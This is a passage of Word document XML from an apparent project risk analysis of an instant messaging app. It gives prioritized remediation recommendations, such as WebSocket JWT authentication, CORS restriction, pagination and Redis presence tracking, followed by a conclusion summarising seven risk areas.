              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Minimal — Unvirtualized DOM list, missing Error Boundary, no disconnect banner, context re-render cascade</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>10. Prioritized Recommendations</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Based on the full-stack risk analysis above, the following recommendations are ordered by priority for implementation:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>10.1 Immediate Priority (Security-Critical)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">1. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Implement Socket.IO authentication middleware</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> — Verify JWT tokens on WebSocket connection establishment to prevent identity spoofing (addresses Risk Areas 1 &amp; 2). 2. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Restrict CORS to specific origins</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> — Replace </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Access-Control-Allow-Origin: *</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> with the actual frontend domain (addresses Risk Area 1). 3. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Migrate JWT storage to httpOnly cookies</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> — Eliminate localStorage-based token storage to prevent XSS-based token theft (addresses Risk Area 1).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>10.2 High Priority (Data Protection &amp; Client Stability)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">4. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Implement message pagination (Backend) &amp; Virtual Scrolling (Frontend)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> — Combine cursor-based API pagination with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>react-window</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> to bound DOM nodes and memory to O(1) viewport size (addresses Risk Areas 4, 5, &amp; 7). 5. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Implement React Error Boundaries</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> — Wrap root application and chat viewport in fallback components to prevent White Screen of Death crashes (addresses Risk Area 7). 6. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Add Socket Connection State UI Banner</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> — Render real-time visual alerts ("Offline", "Reconnecting...") based on socket event listeners (addresses Risk Area 7). 7. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Add per-socket rate limiting</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> — Prevent event flooding by limiting socket emissions to a reasonable rate (addresses Risk Area 2). 8. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Generate unique passwords for Quick Connect users</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> — Replace the hardcoded password with cryptographically random generated passwords (addresses Risk Area 1).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>10.3 Medium Priority (Resilience &amp; Performance)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">9. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Implement Redis-backed presence store</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> — Migrate </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>onlineUsers</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> Map to Redis for crash-resilient presence tracking (addresses Risk Areas 3 &amp; 5). 10. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Add Node.js clustering</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> — Utilize multiple CPU cores for improved throughput and fault tolerance (addresses Risk Area 5). 11. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Cache unread counts in Redis</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> — Reduce per-request aggregation overhead by maintaining incremental counters (addresses Risk Area 5). 12. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Implement input submission debounce &amp; lock</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> — Disable send triggers while HTTP message submission is in-flight (addresses Risk Area 7). 13. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Decompose React Context &amp; apply `React.memo`</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> — Eliminate re-render cascades on high-frequency chat events (addresses Risk Area 7).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>10.4 Low Priority (Hardening)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">14. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Add input validation middleware</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> — Implement content length limits, regex escaping, and request body size limits (addresses Risk Area 6). 15. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Add database indexes</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> — Create compound indexes on frequently queried fields to optimize query performance (addresses Risk Areas 4 &amp; 5). 16. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Implement Content Security Policy headers</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> — Add CSP headers to further reduce XSS attack surface (addresses Risk Area 1).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>11. Conclusion</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">This analysis identified </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>7 distinct risk areas</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> across both backend services and frontend client architecture of the Instant Messaging system:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">1. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Security Vulnerabilities (Areas 1 &amp; 2):</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> Missing WebSocket authentication and localStorage token storage represent immediate security concerns requiring priority remediation. 2. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Architectural &amp; Scalability Limits (Areas 3, 4, &amp; 5):</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> In-memory presence tracking, unpaginated message loading, and single-process execution represent boundaries suitable for a prototype but restrictive for production scale. 3. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Frontend &amp; User Experience Fragility (Area 7):</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> Unvirtualized DOM rendering, unhandled state exceptions (White Screen), and silent socket disconnects threaten client-side stability during high-volume usage. 4. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Input Sanitization (Area 6):</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> Standard edge cases requiring defensive hardening.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">Crucially, this analysis establishes an </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>exhaustive, full-stack risk foundation</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> for Milestone 2. By identifying these concrete design trade-offs and code vulnerabilities now, the development team possesses a clear, justifiable blueprint for the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Revised Design and Implementation enhancements</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> scheduled for delivery in Milestone 3.</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808080"/>
        <w:sz w:val="18"/>
      </w:rPr>
      <w:t xml:space="preserve">Page </w:t>
    </w:r>
    <w:r>
      <w:fldChar w:fldCharType="begin"/>
    </w:r>
    <w:r>
      <w:instrText xml:space="preserve"> PAGE </w:instrText>
    </w:r>
    <w:r>
      <w:fldChar w:fldCharType="end"/>
    </w:r>
    <w:r>
      <w:rPr>
        <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
        <w:color w:val="808080"/>
        <w:sz w:val="18"/>
      </w:rPr>
      <w:t xml:space="preserve"> of </w:t>
    </w:r>
    <w:r>
      <w:fldChar w:fldCharType="begin"/>
    </w:r>
    <w:r>
      <w:instrText xml:space="preserve"> NUMPAGES </w:instrTex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C3E50"/>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C3E50"/>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2C3E5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2C3E50"/>
      <w:sz w:val="23"/>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